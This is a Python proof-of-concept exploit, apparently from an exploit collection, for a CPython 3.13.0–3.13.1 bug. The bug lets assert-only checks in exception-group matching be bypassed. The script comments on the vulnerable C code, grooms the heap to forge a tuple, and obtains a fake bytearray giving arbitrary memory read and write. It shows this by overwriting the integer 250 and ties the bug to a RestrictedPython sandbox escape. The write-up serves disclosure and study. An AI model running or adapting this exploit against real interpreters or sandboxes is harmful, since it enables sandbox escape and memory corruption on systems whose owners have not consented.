"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Checks for the return value of a function we can control are done in asserts which means they're
#       nop'd in release builds, so we can return any object and it will be interpreted as a tuple.
# Tested to work on 3.13.0, 3.13.1 (Patched in 3.13.2)

# bug used for https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-gmj9-h825-chq2

# Here is the vulnerable code as of 3.13.1
# https://github.com/python/cpython/blob/v3.13.1/Python/ceval.c#L1993-L2047
"""
int
_PyEval_ExceptionGroupMatch(PyObject* exc_value, PyObject *match_type,
                            PyObject **match, PyObject **rest)
{
    /* snip */

    /* exc_value does not match match_type.
     * Check for partial match if it's an exception group.
     */
    if (_PyBaseExceptionGroup_Check(exc_value)) {
        PyObject *pair = PyObject_CallMethod(exc_value, "split", "(O)", // <--- calling python code
                                             match_type);
        if (pair == NULL) {
            return -1;
        }
        assert(PyTuple_CheckExact(pair)); // <--- asserts are nop'd out in release builds
        assert(PyTuple_GET_SIZE(pair) == 2); // <--- asserts are nop'd out in release builds
        *match = Py_NewRef(PyTuple_GET_ITEM(pair, 0));
        *rest = Py_NewRef(PyTuple_GET_ITEM(pair, 1));
        Py_DECREF(pair);
        return 0;
    }
    /* no match */
    *match = Py_NewRef(Py_None);
    *rest = Py_NewRef(exc_value);
    return 0;
}
"""

# We can see that the checks to validate the return value of the func are done in asserts, that means that
# release builds won't actually do the check which lets us return any object that will end up being interpreted as a tuple.
# This script does some heap grooming to set up the memory where we can return an object that looks like a tuple, but will
# actually contain our evil object.

from common import evil_bytearray_obj, check_pyversion, i2f

check_pyversion(patched_ver=(3, 13, 2))

# see ./common/common.py for evil bytearray obj explanation
fake_ba, ba_addr = evil_bytearray_obj()

# complex objects are perfect for creating fake tuples (explanation below)
fake_tuple = 1j * i2f(ba_addr)

spray = []
for i in range(100):
    # adding `i` to ensure a new complex object is created each time
    spray.append(i + fake_tuple)
    # same size as the complex object, will be placed after our fake tuple allowing the 2nd value in the tuple to be None
    spray.append([None, None, None, None])

# At this point, our objects should be set up in a way that looks like this in memory
# (too lazy to do a proper hexdump layout, just know each member is 8 bytes for this)
"""
 Tuple Struct Layout |  Our Spray
-----------------------------------------
tuple.ob_refcnt      | complex.ob_refcnt
tuple.ob_type        | complex.ob_type
tuple.ob_size        | complex.real
tuple.ob_item[0]     | complex.imag
tuple.ob_item[1]     | &Py_None
tuple.ob_item[2]     | &Py_None
tuple.ob_item[3]     | &Py_None
tuple.ob_item[4]     | &Py_None
; repeat
"""

# Matching with the tuple struct layout on the left, we can see that if we were to read our
# complex object as a tuple, the first item would be whatever we set for complex.imag, and indicies 1-4
# would contain `None` objects.

# So when we get to this part of the code:
"""
*match = Py_NewRef(PyTuple_GET_ITEM(pair, 0));
*rest = Py_NewRef(PyTuple_GET_ITEM(pair, 1));
"""
# It will read in complex.imag for `match`, and the first `None` from the list for `rest`.
# From there, it will set the exception var (`e` in the exploit) to whatever `match` is (our evil obj in the exploit), 
# and from there it's game over

to_return = spray[-2]

class Evil(ExceptionGroup):
    def split(self, *args):
        global to_return
        return to_return

mem = None
try:
    # NOTE: You don't need to use ValueError, any normal exception can be used here
    raise Evil("wow!", [ValueError()])
except* ValueError as e:
    mem = e

if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100